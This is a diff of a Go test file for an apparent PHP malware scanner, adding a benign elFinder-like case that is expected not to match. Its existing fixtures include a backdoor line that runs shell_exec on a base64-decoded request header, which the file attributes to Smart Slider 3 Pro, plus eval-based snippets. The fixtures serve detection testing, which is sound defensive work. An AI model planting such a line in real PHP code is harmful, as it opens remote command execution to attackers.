@@ -58,6 +58,9 @@ func TestContentPatterns(t *testing.T) {
 		// with an unrelated request elsewhere in the file.
 		{"<?php\n/**\n * @var $_GET['action'] (string) is set if paginating\n */", nil},
 		{"<?php\nwp_remote_post($cron_url, $args);\n" + strings.Repeat("// ...\n", 400) + "function run($code) {\n\teval( $code );\n}", nil},
+		// elFinder fetches URLs, uses temporary files and includes its
+		// drivers, far apart in one file.
+		{"<?php\n$data = file_get_contents('https://example.com/file');\n$tmp = tmpfile();\n" + strings.Repeat("// ...\n", 400) + "foreach ($drivers as $file) {\n\tinclude $file;\n}", nil},
 		// Commands run from decoded data, as in Smart Slider 3 Pro 3.5.1.35.
 		{"<?php $ck = $_SERVER['HTTP_X_CACHE_KEY'];\necho @shell_exec(base64_decode($ck) . ' 2>&1');", []string{"eval-decoded"}},
 		{`<?php $data = json_decode(base64_decode($encoded), true);`, nil},
